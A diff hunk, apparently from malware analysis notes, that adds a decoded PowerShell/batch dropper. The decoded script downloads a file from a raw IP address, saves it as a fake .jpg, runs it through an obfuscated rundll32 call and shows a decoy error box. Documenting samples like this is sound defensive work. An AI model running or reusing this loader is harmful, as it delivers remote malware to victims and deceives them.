@@ -24,6 +24,15 @@ powershell  Add-Type -AssemblyName PresentationCore,PresentationFramework; [Syst
 
 *************************************************
 
+Decoded powershell blob
+
+@echo off
+set ayqKE=%2
+powershell (new-object system.net.webclient).downloadfile('http://146.59.43.159/780683.dat', 'C:\programdata\aEkDSL5.jpg');
+rU%1ll32 C:\programdata\aEkDSL5.jpg,Wind
+powershell Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('The current selection is not supported.', 'Data Read Error', 'OK', 'Error');
+exit
+
 
 *************************************************
 
